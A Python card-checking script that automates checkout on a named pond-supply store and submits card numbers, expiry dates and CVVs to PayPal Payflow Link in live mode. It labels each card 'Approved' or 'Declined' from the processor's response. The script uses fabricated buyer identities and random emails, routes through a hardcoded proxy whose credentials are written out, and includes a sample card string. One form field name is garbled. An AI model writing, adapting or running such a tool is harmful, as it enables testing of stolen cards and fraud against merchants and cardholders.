import requests,names


def RandomName(dato:str=None):
        if dato == 'username': return f"{names.get_first_name()}{names.get_last_name()}{random.randint(1000000,9999999)}"
        elif dato == 'correo': return f"{names.get_first_name()}{names.get_last_name()}{random.randint(1000000,9999999)}@gmail.com"
        elif dato == 'password': return f"{names.get_first_name()}{names.get_last_name()}#{random.randint(1000000,9999999)}"
        else: return 'Valores InCorrectos: username, password, correo'

class CutStr():
    def QueryText(self, data:str = None, chainOne:str = None, chainTwo:str = None):
        return data[ data.index(chainOne) + len (chainOne):data.index(chainTwo,  data.index(chainOne) + len (chainOne))]
    
from requests import Session
import random,string
from retry import retry

def phone_number(longitud):  
    phonenumber = ''.join([str(random.randint(0, 9)) for _ in range(longitud)])
    return phonenumber  

def email_generator():  
    dominio = ['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com']  
    longitud = random.randint(8, 12)  
    usuario = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(longitud))
    correo = usuario + '@' + random.choice(dominio)
    return correo  

proxy_url = 'http://77b7b08f59b2dcc1:RNW78Fm5@res.proxy-seller.com:10000'
class pfrees:
    @retry(tries=3)
    def main(self):
        try:
            self.username = RandomName('username')
            self.correo = RandomName('correo')
            self.password = RandomName('password')
            
            self.session = Session()

            card = input('CC: ') 

            cc, month, year, cvv = card.split('|') 
            if len(year) == 2:
                year = '20' + year  
            if len(month) == 1:
                month = '0' + month  
            

            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-419,es;q=0.9,en;q=0.8','cache-control': 'max-age=0','priority': 'u=0, i','referer': 'https://www.pondbiz.shop/','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',}
            self.session.get('https://www.pondbiz.shop/aquamax-satellite-pre-filter',  headers=headers)

            headers = {'accept': '*/*','accept-language': 'es-419,es;q=0.9,en;q=0.8','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','origin': 'https://www.pondbiz.shop','priority': 'u=1, i','referer': 'https://www.pondbiz.shop/aquamax-satellite-pre-filter','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36','x-requested-with': 'XMLHttpRequest',}
            data = {
            'goto': 'samepage',
            'product_id': '1674',
            'related_id': '1674',
            'qty': '1',
            'addtocart': '',
            'ajax': '1',
            }

            self.session.post('https://www.pondbiz.shop/addtocart', headers=headers, data=data)
            
            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-419,es;q=0.9,en;q=0.8','priority': 'u=0, i','referer': 'https://www.pondbiz.shop/aquamax-satellite-pre-filter','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',}
            params = {'cartid': '',}
            self.session.get('https://www.pondbiz.shop/viewcart', params=params, headers=headers)

            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-419,es;q=0.9,en;q=0.8','cache-control': 'max-age=0','content-type': 'application/x-www-form-urlencoded','origin': 'https://www.pondbiz.shop','priority': 'u=0, i','referer': 'https://www.pondbiz.shop/updatecart','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',}
            data = {
            'qty[22606]': '1',
            'coupon_code': '',
            'deliver_to': 'Residential',
            'ship_to_zip': '85016',
            'ship_to_country': 'US',
            'ship_method_id': '17',
            'checkout': 'Proceed to Checkout',
            }
            self.session.post('https://www.pondbiz.shop/updatecart', headers=headers, data=data) 
            
            email = email_generator() 
            phone = phone_number(10) 
                
            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-419,es;q=0.9,en;q=0.8','cache-control': 'max-age=0','content-type': 'application/x-www-form-urlencoded','origin': 'https://www.pondbiz.shop','priority': 'u=0, i','referer': 'https://www.pondbiz.shop/home/oase/checkout','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',}
            data = {
                'email_address': email,
                'verify_email_address': email,
                'First_Name': 'Pedro',
                'Last_Name': 'Hermandez',
                'Address1': '3358 Dye Street',
                'Address2': '',
                'Zip': '85016',
                'City': 'Phoenix',
                'State': 'AZ',
                'Country': 'US',
                'Telephone': phone,
                'sFirst_Name': 'Pedro',
                'sLast_Name': 'Hermandez',
                'sAddress1': '3358 Dye Street',
                'sAddress2': '',
                'sZip': '85016',
                'sCity': 'Phoenix',
                'sState': 'AZ',
                'sCountry': 'US',
                'sTelephone': phone,
                'Comments': '',
                'Source': '',
                'gift_code': '',
                'account_name': '',
                'account_password': '',
                'Verify_Password': '',
            }

            r5_text = self.session.post('https://www.pondbiz.shop/home/oase/confirmorder',  headers=headers, data=data) 
            securetoken = CutStr().QueryText(r5_text.text, 'SECURETOKEN=', '&') 
            securetokenid = CutStr().QueryText(r5_text.text, 'SECURETOKENID=', '"') 

            
            headers = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','Accept-Language': 'es-419,es;q=0.9','Connection': 'keep-alive','Referer': 'https://www.pondbiz.shop/','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',}
            params = {
                'MODE': 'LIVE',
                'SECURETOKEN': f'{securetoken}',
                'SECURETOKENID': f'{securetokenid}',
            }
            r6_text = self.session.get('https://payflowlink.paypal.com/', params=params, headers=headers)
            
            csrf_token = CutStr().QueryText(r6_text.text, 'name="CSRF_TOKEN" type="hidden" value="', '"') 

            headers = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','Accept-Language': 'es-419,es;q=0.9','Cache-Control': 'max-age=0','Connection': 'keep-alive','Content-Type': 'application/x-www-form-urlencoded','Origin': 'https://payflowlink.paypal.com','Referer': 'https://payflowlink.paypal.com/?MODE=LIVE&SECURETOKEN=' +securetoken+ '&SECURETOKENID=' +securetokenid+ '','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',}
            data = [
                ('subaction', ''),
                ('CARDNUM', '' +cc+ ''),
                ('EXPMONTH', '' +month+ ''),
                ('EXPYEAR', '' +year[-2:]+ ''),
                ('CVV2', '' +cvv+ ''),
                ('startdate_month', ''),
                ('startdateasyncio.run(pfwavs()) _year', ''),
                ('issue_number', ''),
                ('METHOD', 'C'),
                ('PAYMETHOD', 'C'),
                ('FIRST_NAME', 'Anne'),
                ('LAST_NAME', 'Lois'),
                ('template', 'minLayout'),
                ('ADDRESS', '3358 Dye Street'),
                ('CITY', 'Phoenix'),
                ('STATE', 'AZ'),
                ('ZIP', '85016'),
                ('COUNTRY', 'US'),
                ('PHONE', ''),
                ('EMAIL', ''),
                ('SHIPPING_FIRST_NAME', 'Anne'),
                ('SHIPPING_LAST_NAME', 'Lois'),
                ('ADDRESSTOSHIP', '3358 Dye Street'),
                ('CITYTOSHIP', 'Phoenix'),
                ('STATETOSHIP', 'AZ'),
                ('ZIPTOSHIP', '85016'),
                ('COUNTRYTOSHIP', 'US'),
                ('PHONETOSHIP', ''),
                ('EMAILTOSHIP', ''),
                ('TYPE', 'S'),
                ('SHIPAMOUNT', '0.00'),
                ('TAX', '0.00'),
                ('VERBOSITY', 'HIGH'),
                ('DISABLERECEIPT', '1'),
                ('flag3dSecure', ''),
                ('CURRENCY', 'USD'),
                ('STATE', 'AZ'),
                ('swipeData', '0'),
                ('SECURETOKEN', '' +securetoken+ ''),
                ('SECURETOKENID', '' +securetokenid+ ''),
                ('PARMLIST', ''),
                ('MODE', 'LIVE'),
                ('CSRF_TOKEN', '' +csrf_token+ ''),
                ('referringTemplate', 'minlayout'),
            ]

            sr7_text= self.session.post('https://payflowlink.paypal.com/processTransaction.do', headers=headers, data=data)
            r7_text = sr7_text.text
            
        
            respmsg = CutStr().QueryText(r7_text, 'name="RESPMSG" value="', '"') 
            if 'CVV2' in respmsg:return 'Approved! ✅', respmsg
            else:return 'Declined! ❌', respmsg
           
        
        except  : return 'Declined! ❌','Declined: 15005-This transaction cannot be processed. '


if __name__ == "__main__":
    cc = '4782002076830811|12|2029|392'
    auth = pfrees()
    print(auth.main())